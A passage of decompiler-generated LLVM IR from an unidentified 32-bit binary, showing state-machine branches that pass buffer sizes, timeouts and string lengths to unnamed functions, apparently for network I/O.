  %v4_804a7e9 = load i32, i32* %v3_804a6b0, align 8
  store i32 %v4_804a7e9, i32* %eax.global-to-local, align 4
  %v0_804a7ec = load i32, i32* @esp, align 4
  br i1 %v1_804a78f, label %dec_label_pc_804a7da, label %dec_label_pc_804a793

dec_label_pc_804a793:                             ; preds = %dec_label_pc_804a737
  %v2_804a7a5 = inttoptr i32 %v0_804a7ec to i32*
  store i32 %v4_804a7e9, i32* %v2_804a7a5, align 4
  %v0_804a7a8 = load i32, i32* %stack_var_-188, align 4
  %v1_804a7a8 = call i32 @function_804a162(i32 %v0_804a7a8)
  store i8 0, i8* %v4_804a309, align 8
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v3_804a7d0 = add i32 %v2_804a289, %v2_804a306
  %v4_804a7d0 = inttoptr i32 %v3_804a7d0 to i8*
  store i8 1, i8* %v4_804a7d0, align 1
  br label %dec_label_pc_804a8f7

dec_label_pc_804a7da:                             ; preds = %dec_label_pc_804a737
  %v1_804a7ec = add i32 %v0_804a7ec, 8
  %v2_804a7ec = inttoptr i32 %v1_804a7ec to i32*
  store i32 0, i32* %v2_804a7ec, align 4
  %v0_804a7f4 = load i32, i32* @esp, align 4
  %v1_804a7f4 = add i32 %v0_804a7f4, 4
  %v2_804a7f4 = inttoptr i32 %v1_804a7f4 to i32*
  store i32 3, i32* %v2_804a7f4, align 4
  %v0_804a7fc = load i32, i32* %eax.global-to-local, align 4
  %v1_804a7fc = load i32, i32* @esp, align 4
  %v2_804a7fc = inttoptr i32 %v1_804a7fc to i32*
  store i32 %v0_804a7fc, i32* %v2_804a7fc, align 4
  %v0_804a7ff = load i32, i32* %stack_var_-188, align 4
  %v1_804a7ff = load i32, i32* %stack_var_-184, align 4
  %v2_804a7ff = load i32, i32* %stack_var_-180, align 4
  %v3_804a7ff = call i32 @function_804e1dc(i32 %v0_804a7ff, i32 %v1_804a7ff, i32 %v2_804a7ff)
  %v1_804a806 = and i32 %v3_804a7ff, -2049
  store i32 %v1_804a806, i32* @ebx, align 4
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v4_804a81b = load i32, i32* %v3_804a6b0, align 8
  store i32 %v4_804a81b, i32* %eax.global-to-local, align 4
  %v1_804a81e = load i32, i32* @esp, align 4
  %v2_804a81e = add i32 %v1_804a81e, 8
  %v3_804a81e = inttoptr i32 %v2_804a81e to i32*
  store i32 %v1_804a806, i32* %v3_804a81e, align 4
  %v0_804a822 = load i32, i32* @esp, align 4
  %v1_804a822 = add i32 %v0_804a822, 4
  %v2_804a822 = inttoptr i32 %v1_804a822 to i32*
  store i32 4, i32* %v2_804a822, align 4
  %v0_804a82a = load i32, i32* %eax.global-to-local, align 4
  %v1_804a82a = load i32, i32* @esp, align 4
  %v2_804a82a = inttoptr i32 %v1_804a82a to i32*
  store i32 %v0_804a82a, i32* %v2_804a82a, align 4
  %v0_804a82d = load i32, i32* %stack_var_-188, align 4
  %v1_804a82d = load i32, i32* %stack_var_-184, align 4
  %v2_804a82d = load i32, i32* %stack_var_-180, align 4
  %v3_804a82d = call i32 @function_804e1dc(i32 %v0_804a82d, i32 %v1_804a82d, i32 %v2_804a82d)
  store i32 0, i32* %v1_804a65e, align 4
  %v1_804a85d = add i32 %v2_804a659, 16
  %v1_804a860 = inttoptr i32 %v1_804a85d to i16*
  store i16 0, i16* %v1_804a860, align 8
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  %v1_804a876 = add i32 %v2_804a659, 20
  store i32 %v1_804a876, i32* %eax.global-to-local, align 4
  %v1_804a879 = inttoptr i32 %v1_804a876 to i32*
  %v2_804a879 = load i32, i32* %v1_804a879, align 4
  store i32 %v2_804a879, i32* %edx.global-to-local, align 4
  store i32 1024, i32* %eax.global-to-local, align 4
  %v1_804a882 = load i32, i32* @esp, align 4
  %v2_804a882 = add i32 %v1_804a882, 8
  %v3_804a882 = inttoptr i32 %v2_804a882 to i32*
  store i32 1024, i32* %v3_804a882, align 4
  %v0_804a886 = load i32, i32* @esp, align 4
  %v1_804a886 = add i32 %v0_804a886, 4
  %v2_804a886 = inttoptr i32 %v1_804a886 to i32*
  store i32 0, i32* %v2_804a886, align 4
  %v0_804a88e = load i32, i32* %edx.global-to-local, align 4
  %v1_804a88e = load i32, i32* @esp, align 4
  %v2_804a88e = inttoptr i32 %v1_804a88e to i32*
  store i32 %v0_804a88e, i32* %v2_804a88e, align 4
  %v0_804a891 = load i32, i32* %stack_var_-188, align 4
  %v1_804a891 = load i32, i32* %stack_var_-184, align 4
  %v2_804a891 = load i32, i32* %stack_var_-180, align 4
  %v3_804a891 = inttoptr i32 %v0_804a891 to i8*
  %v4_804a891 = call i32 @function_804f698(i8* %v3_804a891, i32 %v1_804a891, i32 %v2_804a891)
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  store i8 2, i8* %v4_804a309, align 8
  br label %dec_label_pc_804b759

dec_label_pc_804a8af:                             ; preds = %dec_label_pc_804a688
  %v13_804a8af = icmp eq i32 %v5_804a725, -1
  %v1_804a8b3 = icmp eq i1 %v13_804a8af, false
  br i1 %v1_804a8b3, label %dec_label_pc_804a8f7, label %dec_label_pc_804a8b5

dec_label_pc_804a8b5:                             ; preds = %dec_label_pc_804a8af
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v4_804a8c4 = load i32, i32* %v3_804a6b0, align 8
  store i32 %v4_804a8c4, i32* %eax.global-to-local, align 4
  %v1_804a8c7 = load i32, i32* @esp, align 4
  %v2_804a8c7 = inttoptr i32 %v1_804a8c7 to i32*
  store i32 %v4_804a8c4, i32* %v2_804a8c7, align 4
  %v1_804a8ca = call i32 @function_804a162(i32 %v5_804a725)
  store i8 0, i8* %v4_804a309, align 8
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v3_804a8f2 = add i32 %v2_804a289, %v2_804a306
  %v4_804a8f2 = inttoptr i32 %v3_804a8f2 to i8*
  store i8 1, i8* %v4_804a8f2, align 1
  br label %dec_label_pc_804a8f7

dec_label_pc_804a8f7:                             ; preds = %dec_label_pc_804a8af, %dec_label_pc_804a793, %dec_label_pc_804a8b5
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  store i32 %v1_804a65b, i32* %eax.global-to-local, align 4
  %v2_804a90b = load i32, i32* %v1_804a65e, align 4
  store i32 %v2_804a90b, i32* %eax.global-to-local, align 4
  %v1_804a90d = add i32 %v2_804a90b, 10
  store i32 %v1_804a90d, i32* @ebx, align 4
  %v0_804a910 = load i32, i32* @esp, align 4
  %v1_804a910 = inttoptr i32 %v0_804a910 to i32*
  store i32 0, i32* %v1_804a910, align 4
  %v0_804a917 = load i32, i32* %stack_var_-188, align 4
  %v1_804a917 = inttoptr i32 %v0_804a917 to i32*
  %v2_804a917 = call i32 @function_804e5dc(i32* %v1_804a917)
  store i32 %v2_804a917, i32* %eax.global-to-local, align 4
  %v0_804a91c = load i32, i32* @ebx, align 4
  %v7_804a91c = icmp ult i32 %v0_804a91c, %v2_804a917
  %v1_804a91e = icmp eq i1 %v7_804a91c, false
  br i1 %v1_804a91e, label %dec_label_pc_804b759, label %dec_label_pc_804a924

dec_label_pc_804a924:                             ; preds = %dec_label_pc_804a8f7
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v4_804a933 = load i32, i32* %v3_804a6b0, align 8
  store i32 %v4_804a933, i32* %eax.global-to-local, align 4
  %v1_804a936 = load i32, i32* @esp, align 4
  %v2_804a936 = inttoptr i32 %v1_804a936 to i32*
  store i32 %v4_804a933, i32* %v2_804a936, align 4
  %v0_804a939 = load i32, i32* %stack_var_-188, align 4
  %v1_804a939 = call i32 @function_804a162(i32 %v0_804a939)
  store i8 0, i8* %v4_804a309, align 8
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v3_804a961 = add i32 %v2_804a289, %v2_804a306
  %v4_804a961 = inttoptr i32 %v3_804a961 to i8*
  store i8 1, i8* %v4_804a961, align 1
  br label %dec_label_pc_804b759

dec_label_pc_804a96b:                             ; preds = %dec_label_pc_804a2fa
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  %v2_804a97a = add i32 %v2_804a306, %v2_804a245
  %v1_804a97c = add i32 %v2_804a97a, 12
  store i32 %v1_804a97c, i32* %eax.global-to-local, align 4
  %v1_804a97f = inttoptr i32 %v1_804a97c to i32*
  %v2_804a97f = load i32, i32* %v1_804a97f, align 4
  store i32 %v2_804a97f, i32* %eax.global-to-local, align 4
  %v1_804a981 = icmp eq i32 %v2_804a97f, 0
  %v1_804a983 = icmp eq i1 %v1_804a981, false
  br i1 %v1_804a983, label %dec_label_pc_804a9a9, label %dec_label_pc_804a985

dec_label_pc_804a985:                             ; preds = %dec_label_pc_804a96b
  store i32 %v1_804a425, i32* @ebx, align 4
  %v0_804a988 = load i32, i32* @esp, align 4
  %v1_804a988 = inttoptr i32 %v0_804a988 to i32*
  store i32 0, i32* %v1_804a988, align 4
  %v1_804a98f = inttoptr i32 %v6_804a309 to i32*
  %v2_804a98f = call i32 @function_804e5dc(i32* %v1_804a98f)
  store i32 %v2_804a245, i32* %edx.global-to-local, align 4
  %v0_804a999 = load i32, i32* @ebx, align 4
  %v2_804a99f = mul i32 %v0_804a999, 24
  %v2_804a9a2 = add i32 %v2_804a99f, %v2_804a245
  %v1_804a9a4 = add i32 %v2_804a9a2, 12
  store i32 %v1_804a9a4, i32* %eax.global-to-local, align 4
  %v2_804a9a7 = inttoptr i32 %v1_804a9a4 to i32*
  store i32 %v2_804a98f, i32* %v2_804a9a7, align 4
  br label %dec_label_pc_804a9a9

dec_label_pc_804a9a9:                             ; preds = %dec_label_pc_804a96b, %dec_label_pc_804a985
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  %v1_804a9ba = add i32 %v2_804a97a, 20
  store i32 %v1_804a9ba, i32* %eax.global-to-local, align 4
  %v1_804a9bd = inttoptr i32 %v1_804a9ba to i32*
  %v2_804a9bd = load i32, i32* %v1_804a9bd, align 4
  store i32 %v2_804a9bd, i32* %eax.global-to-local, align 4
  %v1_804a9bf = load i32, i32* @esp, align 4
  %v2_804a9bf = inttoptr i32 %v1_804a9bf to i32*
  store i32 %v2_804a9bd, i32* %v2_804a9bf, align 4
  %v0_804a9c2 = load i32, i32* %stack_var_-188, align 4
  %v1_804a9c2 = inttoptr i32 %v0_804a9c2 to i8*
  %v2_804a9c2 = call i32 @function_80498c4(i8* %v1_804a9c2)
  store i32 %v2_804a9c2, i32* %eax.global-to-local, align 4
  %v1_804a9c7 = icmp eq i32 %v2_804a9c2, 0
  br i1 %v1_804a9c7, label %dec_label_pc_804a9df, label %dec_label_pc_804a9cb

dec_label_pc_804a9cb:                             ; preds = %dec_label_pc_804a9a9
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  store i8 8, i8* %v4_804a309, align 8
  br label %dec_label_pc_804a9df

dec_label_pc_804a9df:                             ; preds = %dec_label_pc_804a9a9, %dec_label_pc_804a9cb
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  %v1_804a9f0 = add i32 %v2_804a97a, 16
  store i32 %v1_804a9f0, i32* %eax.global-to-local, align 4
  %v1_804a9f3 = inttoptr i32 %v1_804a9f0 to i16*
  %v2_804a9f3 = load i16, i16* %v1_804a9f3, align 8
  %v3_804a9f3 = zext i16 %v2_804a9f3 to i32
  store i32 %v3_804a9f3, i32* @esi, align 4
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  store i32 %v1_804a9ba, i32* %eax.global-to-local, align 4
  %v2_804aa0c = load i32, i32* %v1_804a9bd, align 4
  store i32 %v2_804aa0c, i32* @ebx, align 4
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v3_804aa1d = inttoptr i32 %v2_804a97a to i32*
  %v4_804aa1d = load i32, i32* %v3_804aa1d, align 8
  store i32 %v4_804aa1d, i32* %eax.global-to-local, align 4
  %v1_804aa20 = load i32, i32* @esp, align 4
  %v2_804aa20 = add i32 %v1_804aa20, 28
  %v3_804aa20 = inttoptr i32 %v2_804aa20 to i32*
  store i32 %v3_804a9f3, i32* %v3_804aa20, align 4
  %v0_804aa24 = load i32, i32* @esp, align 4
  %v1_804aa24 = add i32 %v0_804aa24, 24
  %v2_804aa24 = inttoptr i32 %v1_804aa24 to i32*
  store i32 1024, i32* %v2_804aa24, align 4
  %v0_804aa2c = load i32, i32* @ebx, align 4
  %v1_804aa2c = load i32, i32* @esp, align 4
  %v2_804aa2c = add i32 %v1_804aa2c, 20
  %v3_804aa2c = inttoptr i32 %v2_804aa2c to i32*
  store i32 %v0_804aa2c, i32* %v3_804aa2c, align 4
  %v0_804aa30 = load i32, i32* @esp, align 4
  %v1_804aa30 = add i32 %v0_804aa30, 16
  %v2_804aa30 = inttoptr i32 %v1_804aa30 to i32*
  store i32 10000, i32* %v2_804aa30, align 4
  %v0_804aa38 = load i32, i32* @esp, align 4
  %v1_804aa38 = add i32 %v0_804aa38, 12
  %v2_804aa38 = inttoptr i32 %v1_804aa38 to i32*
  store i32 0, i32* %v2_804aa38, align 4
  %v0_804aa40 = load i32, i32* @esp, align 4
  %v1_804aa40 = add i32 %v0_804aa40, 8
  %v2_804aa40 = inttoptr i32 %v1_804aa40 to i32*
  store i32 0, i32* %v2_804aa40, align 4
  %v0_804aa48 = load i32, i32* @esp, align 4
  %v1_804aa48 = add i32 %v0_804aa48, 4
  %v2_804aa48 = inttoptr i32 %v1_804aa48 to i32*
  store i32 ptrtoint ([6 x i8]* @global_var_8052e6f.32 to i32), i32* %v2_804aa48, align 4
  %v0_804aa50 = load i32, i32* %eax.global-to-local, align 4
  %v1_804aa50 = load i32, i32* @esp, align 4
  %v2_804aa50 = inttoptr i32 %v1_804aa50 to i32*
  store i32 %v0_804aa50, i32* %v2_804aa50, align 4
  %v0_804aa53 = call i32 @function_80499cb()
  store i32 %v0_804aa53, i32* %eax.global-to-local, align 4
  %v1_804aa58 = icmp eq i32 %v0_804aa53, 0
  br i1 %v1_804aa58, label %dec_label_pc_804aad9, label %dec_label_pc_804aa5c

dec_label_pc_804aa5c:                             ; preds = %dec_label_pc_804a9df
  store i32 0, i32* %v1_804a97f, align 4
  store i16 0, i16* %v1_804a9f3, align 8
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  store i32 %v1_804a9ba, i32* %eax.global-to-local, align 4
  %v2_804aaa3 = load i32, i32* %v1_804a9bd, align 4
  store i32 %v2_804aaa3, i32* %edx.global-to-local, align 4
  store i32 1024, i32* %eax.global-to-local, align 4
  %v1_804aaac = load i32, i32* @esp, align 4
  %v2_804aaac = add i32 %v1_804aaac, 8
  %v3_804aaac = inttoptr i32 %v2_804aaac to i32*
  store i32 1024, i32* %v3_804aaac, align 4
  %v0_804aab0 = load i32, i32* @esp, align 4
  %v1_804aab0 = add i32 %v0_804aab0, 4
  %v2_804aab0 = inttoptr i32 %v1_804aab0 to i32*
  store i32 0, i32* %v2_804aab0, align 4
  %v0_804aab8 = load i32, i32* %edx.global-to-local, align 4
  %v1_804aab8 = load i32, i32* @esp, align 4
  %v2_804aab8 = inttoptr i32 %v1_804aab8 to i32*
  store i32 %v0_804aab8, i32* %v2_804aab8, align 4
  %v0_804aabb = load i32, i32* %stack_var_-188, align 4
  %v1_804aabb = load i32, i32* %stack_var_-184, align 4
  %v2_804aabb = load i32, i32* %stack_var_-180, align 4
  %v3_804aabb = inttoptr i32 %v0_804aabb to i8*
  %v4_804aabb = call i32 @function_804f698(i8* %v3_804aabb, i32 %v1_804aabb, i32 %v2_804aabb)
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  store i8 3, i8* %v4_804a309, align 8
  br label %dec_label_pc_804b759

dec_label_pc_804aad9:                             ; preds = %dec_label_pc_804a9df
  store i32 %v1_804a425, i32* %ebx.global-to-local, align 4
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  store i32 %v1_804a9ba, i32* %eax.global-to-local, align 4
  %v2_804aaf0 = load i32, i32* %v1_804a9bd, align 4
  %v1_804aafd = and i32 %v2_804aaf0, -256
  store i32 %v1_804aafd, i32* %eax.global-to-local, align 4
  %v4_804ab00 = inttoptr i32 %v2_804aaf0 to i8*
  store i32 %v2_804aaf0, i32* @edi, align 4
  %v3_804ab06 = call i32 @_strlen(i8* %v4_804ab00)
  %v0_804ab13 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804ab19 = mul i32 %v0_804ab13, 24
  %v1_804ab1e = add i32 %v2_804ab1c, %v2_804ab19
  %v1_804ab21 = trunc i32 %v3_804ab06 to i16
  %v3_804ab21 = inttoptr i32 %v1_804ab1e to i16*
  store i16 %v1_804ab21, i16* %v3_804ab21, align 8
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  store i32 %v1_804a97c, i32* %eax.global-to-local, align 4
  %v2_804ab38 = load i32, i32* %v1_804a97f, align 4
  store i32 %v2_804ab38, i32* %eax.global-to-local, align 4
  %v1_804ab3a = add i32 %v2_804ab38, 30
  store i32 %v1_804ab3a, i32* @ebx, align 4
  %v0_804ab3d = load i32, i32* @esp, align 4
  %v1_804ab3d = inttoptr i32 %v0_804ab3d to i32*
  store i32 0, i32* %v1_804ab3d, align 4
  %v1_804ab44 = inttoptr i32 %v2_804aaf0 to i32*
  %v2_804ab44 = call i32 @function_804e5dc(i32* %v1_804ab44)
  store i32 %v2_804ab44, i32* %eax.global-to-local, align 4
  %v0_804ab49 = load i32, i32* @ebx, align 4
  %v7_804ab49 = icmp ult i32 %v0_804ab49, %v2_804ab44
  %v1_804ab4b = icmp eq i1 %v7_804ab49, false
  br i1 %v1_804ab4b, label %dec_label_pc_804b759, label %dec_label_pc_804ab51

dec_label_pc_804ab51:                             ; preds = %dec_label_pc_804aad9
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v4_804ab60 = load i32, i32* %v3_804aa1d, align 8
  store i32 %v4_804ab60, i32* %eax.global-to-local, align 4
  %v1_804ab63 = load i32, i32* @esp, align 4
  %v2_804ab63 = inttoptr i32 %v1_804ab63 to i32*
  store i32 %v4_804ab60, i32* %v2_804ab63, align 4
  %v1_804ab66 = call i32 @function_804a162(i32 %v2_804aaf0)
  store i8 0, i8* %v4_804a309, align 8
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v3_804ab8e = add i32 %v2_804a289, %v2_804a306
  %v4_804ab8e = inttoptr i32 %v3_804ab8e to i8*
  store i8 1, i8* %v4_804ab8e, align 1
  br label %dec_label_pc_804b759

dec_label_pc_804ab98:                             ; preds = %dec_label_pc_804a2fa
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v3_804aba7 = add i32 %.pre, %v2_804a306
  %v4_804aba7 = inttoptr i32 %v3_804aba7 to i8*
  %v5_804aba7 = load i8, i8* %v4_804aba7, align 2
  %v6_804aba7 = zext i8 %v5_804aba7 to i32
  store i32 %v6_804aba7, i32* %eax.global-to-local, align 4
  %v1_804abaf = mul nuw nsw i32 %v6_804aba7, 4
  %v2_804abaf = add nuw nsw i32 %v1_804abaf, 134567464
  %v3_804abaf = inttoptr i32 %v2_804abaf to i32*
  %v4_804abaf = load i32, i32* %v3_804abaf, align 4
  %v1_804abc1 = and i32 %v4_804abaf, -256
  store i32 %v1_804abc1, i32* %eax.global-to-local, align 4
  %v4_804abc4 = inttoptr i32 %v4_804abaf to i8*
  store i32 %v4_804abaf, i32* @edi, align 4
  %v3_804abca = call i32 @_strlen(i8* %v4_804abc4)
  store i32 %v3_804abca, i32* @esi, align 4
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v5_804abe2 = load i8, i8* %v4_804aba7, align 2
  %v6_804abe2 = zext i8 %v5_804abe2 to i32
  store i32 %v6_804abe2, i32* %eax.global-to-local, align 4
  %v1_804abea = mul nuw nsw i32 %v6_804abe2, 4
  %v2_804abea = add nuw nsw i32 %v1_804abea, 134567464
  %v3_804abea = inttoptr i32 %v2_804abea to i32*
  %v4_804abea = load i32, i32* %v3_804abea, align 4
  store i32 %v4_804abea, i32* @ebx, align 4
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v2_804ac00 = add i32 %v2_804a306, %v2_804a245
  %v3_804ac00 = inttoptr i32 %v2_804ac00 to i32*
  %v4_804ac00 = load i32, i32* %v3_804ac00, align 8
  store i32 %v4_804ac00, i32* %eax.global-to-local, align 4
  %v0_804ac03 = load i32, i32* @esp, align 4
  %v1_804ac03 = add i32 %v0_804ac03, 12
  %v2_804ac03 = inttoptr i32 %v1_804ac03 to i32*
  store i32 16384, i32* %v2_804ac03, align 4
  %v0_804ac0b = load i32, i32* @esi, align 4
  %v1_804ac0b = load i32, i32* @esp, align 4
  %v2_804ac0b = add i32 %v1_804ac0b, 8
  %v3_804ac0b = inttoptr i32 %v2_804ac0b to i32*
  store i32 %v0_804ac0b, i32* %v3_804ac0b, align 4
  %v0_804ac0f = load i32, i32* @ebx, align 4
  %v1_804ac0f = load i32, i32* @esp, align 4
  %v2_804ac0f = add i32 %v1_804ac0f, 4
  %v3_804ac0f = inttoptr i32 %v2_804ac0f to i32*
  store i32 %v0_804ac0f, i32* %v3_804ac0f, align 4
  %v0_804ac13 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ac13 = load i32, i32* @esp, align 4
  %v2_804ac13 = inttoptr i32 %v1_804ac13 to i32*
  store i32 %v0_804ac13, i32* %v2_804ac13, align 4
  %v4_804ac16 = call i32 @function_804fb14(i32 %v4_804abaf, i32 %stack_var_-224.215, i32 %.v2_804a1b4, i32 %v2_804a245)
  %v2_804ac1b = icmp slt i32 %v4_804ac16, 0
  %v1_804ac1d = icmp eq i1 %v2_804ac1b, false
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v4_804ac75 = load i32, i32* %v3_804ac00, align 8
  store i32 %v4_804ac75, i32* %eax.global-to-local, align 4
  %v0_804ac78 = load i32, i32* @esp, align 4
  br i1 %v1_804ac1d, label %dec_label_pc_804ac66, label %dec_label_pc_804ac1f

dec_label_pc_804ac1f:                             ; preds = %dec_label_pc_804ab98
  %v2_804ac31 = inttoptr i32 %v0_804ac78 to i32*
  store i32 %v4_804ac75, i32* %v2_804ac31, align 4
  %v1_804ac34 = call i32 @function_804a162(i32 %v4_804abaf)
  store i8 0, i8* %v4_804a309, align 8
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v3_804ac5c = add i32 %v2_804a289, %v2_804a306
  %v4_804ac5c = inttoptr i32 %v3_804ac5c to i8*
  store i8 1, i8* %v4_804ac5c, align 1
  br label %dec_label_pc_804b759

dec_label_pc_804ac66:                             ; preds = %dec_label_pc_804ab98
  %v1_804ac78 = add i32 %v0_804ac78, 12
  %v2_804ac78 = inttoptr i32 %v1_804ac78 to i32*
  store i32 16384, i32* %v2_804ac78, align 4
  %v0_804ac80 = load i32, i32* @esp, align 4
  %v1_804ac80 = add i32 %v0_804ac80, 8
  %v2_804ac80 = inttoptr i32 %v1_804ac80 to i32*
  store i32 2, i32* %v2_804ac80, align 4
  %v0_804ac88 = load i32, i32* @esp, align 4
  %v1_804ac88 = add i32 %v0_804ac88, 4
  %v2_804ac88 = inttoptr i32 %v1_804ac88 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8052e75.33 to i32), i32* %v2_804ac88, align 4
  %v0_804ac90 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ac90 = load i32, i32* @esp, align 4
  %v2_804ac90 = inttoptr i32 %v1_804ac90 to i32*
  store i32 %v0_804ac90, i32* %v2_804ac90, align 4
  %v4_804ac93 = call i32 @function_804fb14(i32 %v4_804abaf, i32 %stack_var_-224.215, i32 %.v2_804a1b4, i32 %v2_804a245)
  %v2_804ac98 = icmp slt i32 %v4_804ac93, 0
  %v1_804ac9a = icmp eq i1 %v2_804ac98, false
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  br i1 %v1_804ac9a, label %dec_label_pc_804ace3, label %dec_label_pc_804ac9c

dec_label_pc_804ac9c:                             ; preds = %dec_label_pc_804ac66
  %v4_804acab = load i32, i32* %v3_804ac00, align 8
  store i32 %v4_804acab, i32* %eax.global-to-local, align 4
  %v1_804acae = load i32, i32* @esp, align 4
  %v2_804acae = inttoptr i32 %v1_804acae to i32*
  store i32 %v4_804acab, i32* %v2_804acae, align 4
  %v1_804acb1 = call i32 @function_804a162(i32 %v4_804abaf)
  store i8 0, i8* %v4_804a309, align 8
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v3_804acd9 = add i32 %v2_804a289, %v2_804a306
  %v4_804acd9 = inttoptr i32 %v3_804acd9 to i8*
  store i8 1, i8* %v4_804acd9, align 1
  br label %dec_label_pc_804b759

dec_label_pc_804ace3:                             ; preds = %dec_label_pc_804ac66
  store i8 4, i8* %v4_804a309, align 8
  br label %dec_label_pc_804b759

dec_label_pc_804acfc:                             ; preds = %dec_label_pc_804a2fa
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  %v2_804ad0b = add i32 %v2_804a306, %v2_804a245
  %v1_804ad0d = add i32 %v2_804ad0b, 12
  store i32 %v1_804ad0d, i32* %eax.global-to-local, align 4
  %v1_804ad10 = inttoptr i32 %v1_804ad0d to i32*
  %v2_804ad10 = load i32, i32* %v1_804ad10, align 4
  store i32 %v2_804ad10, i32* %eax.global-to-local, align 4
  %v1_804ad12 = icmp eq i32 %v2_804ad10, 0
  %v1_804ad14 = icmp eq i1 %v1_804ad12, false
  br i1 %v1_804ad14, label %dec_label_pc_804ad3a, label %dec_label_pc_804ad16

dec_label_pc_804ad16:                             ; preds = %dec_label_pc_804acfc
  store i32 %v1_804a425, i32* @ebx, align 4
  %v0_804ad19 = load i32, i32* @esp, align 4
  %v1_804ad19 = inttoptr i32 %v0_804ad19 to i32*
  store i32 0, i32* %v1_804ad19, align 4
  %v1_804ad20 = inttoptr i32 %v6_804a309 to i32*
  %v2_804ad20 = call i32 @function_804e5dc(i32* %v1_804ad20)
  store i32 %v2_804a245, i32* %edx.global-to-local, align 4
  %v0_804ad2a = load i32, i32* @ebx, align 4
  %v2_804ad30 = mul i32 %v0_804ad2a, 24
  %v2_804ad33 = add i32 %v2_804ad30, %v2_804a245
  %v1_804ad35 = add i32 %v2_804ad33, 12
  store i32 %v1_804ad35, i32* %eax.global-to-local, align 4
  %v2_804ad38 = inttoptr i32 %v1_804ad35 to i32*
  store i32 %v2_804ad20, i32* %v2_804ad38, align 4
  br label %dec_label_pc_804ad3a

dec_label_pc_804ad3a:                             ; preds = %dec_label_pc_804acfc, %dec_label_pc_804ad16
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  %v1_804ad4b = add i32 %v2_804ad0b, 16
  store i32 %v1_804ad4b, i32* %eax.global-to-local, align 4
  %v1_804ad4e = inttoptr i32 %v1_804ad4b to i16*
  %v2_804ad4e = load i16, i16* %v1_804ad4e, align 8
  %v3_804ad4e = zext i16 %v2_804ad4e to i32
  store i32 %v3_804ad4e, i32* @esi, align 4
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  %v1_804ad64 = add i32 %v2_804ad0b, 20
  store i32 %v1_804ad64, i32* %eax.global-to-local, align 4
  %v1_804ad67 = inttoptr i32 %v1_804ad64 to i32*
  %v2_804ad67 = load i32, i32* %v1_804ad67, align 4
  store i32 %v2_804ad67, i32* @ebx, align 4
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v3_804ad78 = inttoptr i32 %v2_804ad0b to i32*
  %v4_804ad78 = load i32, i32* %v3_804ad78, align 8
  store i32 %v4_804ad78, i32* %eax.global-to-local, align 4
  %v1_804ad7b = load i32, i32* @esp, align 4
  %v2_804ad7b = add i32 %v1_804ad7b, 28
  %v3_804ad7b = inttoptr i32 %v2_804ad7b to i32*
  store i32 %v3_804ad4e, i32* %v3_804ad7b, align 4
  %v0_804ad7f = load i32, i32* @esp, align 4
  %v1_804ad7f = add i32 %v0_804ad7f, 24
  %v2_804ad7f = inttoptr i32 %v1_804ad7f to i32*
  store i32 1024, i32* %v2_804ad7f, align 4
  %v0_804ad87 = load i32, i32* @ebx, align 4
  %v1_804ad87 = load i32, i32* @esp, align 4
  %v2_804ad87 = add i32 %v1_804ad87, 20
  %v3_804ad87 = inttoptr i32 %v2_804ad87 to i32*
  store i32 %v0_804ad87, i32* %v3_804ad87, align 4
  %v0_804ad8b = load i32, i32* @esp, align 4
  %v1_804ad8b = add i32 %v0_804ad8b, 16
  %v2_804ad8b = inttoptr i32 %v1_804ad8b to i32*
  store i32 10000, i32* %v2_804ad8b, align 4
  %v0_804ad93 = load i32, i32* @esp, align 4
